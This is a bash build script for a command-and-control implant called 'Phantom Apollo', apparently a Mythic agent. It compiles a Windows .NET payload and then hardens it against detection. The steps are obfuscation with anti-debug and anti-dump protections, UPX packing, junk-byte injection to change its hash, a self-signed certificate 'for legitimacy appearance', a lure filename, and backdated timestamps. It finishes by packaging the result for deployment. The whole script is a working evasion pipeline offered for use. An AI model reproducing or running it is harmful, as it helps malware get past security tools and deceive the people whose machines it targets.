#!/bin/bash

# Advanced Build Script with Anti-Detection Techniques
# For Phantom Apollo C2 Agent

set -e

AGENT_DIR="/opt/mythic/Payload_Types/phantom_apollo/agent_code"
BUILD_DIR="$AGENT_DIR/bin"
TOOLS_DIR="$AGENT_DIR/tools"

echo "[+] Phantom Apollo - Advanced Evasive Build System"
echo "[+] Preparing build environment..."

# Create directories
mkdir -p $BUILD_DIR
mkdir -p $TOOLS_DIR

# Install required tools for evasion
echo "[+] Installing evasion tools..."

# Install UPX packer
if ! command -v upx &> /dev/null; then
    echo "[+] Installing UPX packer..."
    wget -q https://github.com/upx/upx/releases/download/v4.0.2/upx-4.0.2-amd64_linux.tar.xz -O /tmp/upx.tar.xz
    tar -xf /tmp/upx.tar.xz -C /tmp/
    cp /tmp/upx-4.0.2-amd64_linux/upx /usr/local/bin/
    chmod +x /usr/local/bin/upx
fi

# Install ConfuserEx for .NET obfuscation
echo "[+] Preparing ConfuserEx..."
if [ ! -f "$TOOLS_DIR/ConfuserEx.CLI.exe" ]; then
    wget -q https://github.com/mkaring/ConfuserEx/releases/download/v1.6.0/ConfuserEx-CLI.zip -O /tmp/confuserex.zip
    unzip -q /tmp/confuserex.zip -d $TOOLS_DIR/
fi

# Install Eazfuscator for additional obfuscation
echo "[+] Preparing additional obfuscation tools..."

# Create advanced obfuscation config
cat > $TOOLS_DIR/confuser.crproj << 'EOF'
<Project xmlns="http://confuser.codeplex.com" xmlns:x="http://www.w3.org/2001/XMLSchema-instance" x:schemaLocation="http://confuser.codeplex.com ConfuserEx.xsd">
  <Rule pattern="true">
    <Protection id="anti debug" />
    <Protection id="anti dump" />
    <Protection id="anti ildasm" />
    <Protection id="anti tamper" />
    <Protection id="constants" />
    <Protection id="ctrl flow" />
    <Protection id="invalid metadata" />
    <Protection id="ref proxy" />
    <Protection id="rename">
      <Argument name="mode" value="letters" />
      <Argument name="password" value="phantom2024" />
      <Argument name="renPublic" value="true" />
    </Protection>
    <Protection id="resources" />
  </Rule>
</Project>
EOF

# Compile with optimizations
echo "[+] Compiling Phantom Apollo with optimizations..."

# Set build configuration
export DOTNET_CLI_TELEMETRY_OPTOUT=1
export DOTNET_SKIP_FIRST_TIME_EXPERIENCE=1

# Build with aggressive optimizations
dotnet build $AGENT_DIR/Phantom.sln \
    --configuration Release \
    --verbosity quiet \
    -p:Platform="Any CPU" \
    -p:Optimize=true \
    -p:DebugType=none \
    -p:DebugSymbols=false \
    -p:TrimUnusedDependencies=true \
    -p:PublishTrimmed=true \
    -p:SelfContained=true \
    -p:RuntimeIdentifier=win-x64 \
    -o $BUILD_DIR/

# Apply ConfuserEx obfuscation
echo "[+] Applying advanced .NET obfuscation..."
if [ -f "$BUILD_DIR/Phantom.exe" ]; then
    cp $BUILD_DIR/Phantom.exe $BUILD_DIR/Phantom_original.exe
    
    # Apply ConfuserEx
    mono $TOOLS_DIR/ConfuserEx.CLI.exe -n $TOOLS_DIR/confuser.crproj $BUILD_DIR/Phantom_original.exe
    
    # Replace original if obfuscation succeeded
    if [ -f "$BUILD_DIR/Confused/Phantom_original.exe" ]; then
        mv $BUILD_DIR/Confused/Phantom_original.exe $BUILD_DIR/Phantom_obfuscated.exe
    fi
fi

# Apply UPX packing with maximum compression
echo "[+] Applying UPX packing..."
if [ -f "$BUILD_DIR/Phantom_obfuscated.exe" ]; then
    upx --ultra-brute --compress-exports=1 --compress-icons=2 --strip-relocs=1 $BUILD_DIR/Phantom_obfuscated.exe -o $BUILD_DIR/Phantom_packed.exe
else
    upx --ultra-brute --compress-exports=1 --compress-icons=2 --strip-relocs=1 $BUILD_DIR/Phantom.exe -o $BUILD_DIR/Phantom_packed.exe
fi

# Add entropy and junk data
echo "[+] Adding entropy and anti-analysis features..."
cat > $TOOLS_DIR/entropy_injector.py << 'EOF'
#!/usr/bin/env python3
import os
import random
import sys

def inject_entropy(file_path):
    """Inject random data to increase entropy"""
    with open(file_path, 'rb') as f:
        data = f.read()
    
    # Add random overlay data
    junk_size = random.randint(1024, 4096)
    junk_data = bytes([random.randint(0, 255) for _ in range(junk_size)])
    
    with open(file_path, 'wb') as f:
        f.write(data + junk_data)
    
    print(f"[+] Added {junk_size} bytes of entropy to {file_path}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 entropy_injector.py <file>")
        sys.exit(1)
    
    inject_entropy(sys.argv[1])
EOF

python3 $TOOLS_DIR/entropy_injector.py $BUILD_DIR/Phantom_packed.exe

# Apply additional evasion techniques
echo "[+] Applying final evasion techniques..."

# Code signing with self-signed certificate (for legitimacy appearance)
cat > $TOOLS_DIR/create_cert.sh << 'EOF'
#!/bin/bash
# Create self-signed certificate for code signing appearance
openssl req -new -x509 -keyout phantom_key.pem -out phantom_cert.pem -days 365 -nodes \
    -subj "/C=US/ST=CA/L=San Francisco/O=Phantom Corp/OU=Security/CN=Phantom Cert"

# Convert to PFX format
openssl pkcs12 -export -out phantom.pfx -inkey phantom_key.pem -in phantom_cert.pem -password pass:phantom123
EOF

chmod +x $TOOLS_DIR/create_cert.sh
cd $TOOLS_DIR && ./create_cert.sh

# Create final payload with timestamp modification
echo "[+] Creating final payload..."
FINAL_NAME="phantom_smart_renewal_$(date +%Y%m%d).exe"

if [ -f "$BUILD_DIR/Phantom_packed.exe" ]; then
    cp $BUILD_DIR/Phantom_packed.exe $BUILD_DIR/$FINAL_NAME
    
    # Modify file timestamps to appear legitimate
    touch -t 202301150900 $BUILD_DIR/$FINAL_NAME
    
    echo "[+] Final payload created: $FINAL_NAME"
    echo "[+] File size: $(du -h $BUILD_DIR/$FINAL_NAME | cut -f1)"
    echo "[+] MD5: $(md5sum $BUILD_DIR/$FINAL_NAME | cut -d' ' -f1)"
    echo "[+] SHA256: $(sha256sum $BUILD_DIR/$FINAL_NAME | cut -d' ' -f1)"
else
    echo "[-] Error: No packed executable found!"
    exit 1
fi

# Create deployment package
echo "[+] Creating deployment package..."
cd $BUILD_DIR
tar -czf phantom_apollo_deployment.tar.gz $FINAL_NAME
echo "[+] Deployment package: phantom_apollo_deployment.tar.gz"

echo "[+] Build completed successfully with advanced evasion techniques!"
echo "[+] Techniques applied:"
echo "    - Advanced .NET obfuscation (ConfuserEx)"
echo "    - UPX packing with maximum compression"
echo "    - Entropy injection"
echo "    - Timestamp manipulation"
echo "    - Code signing appearance"
echo "    - Anti-debug/anti-dump protection"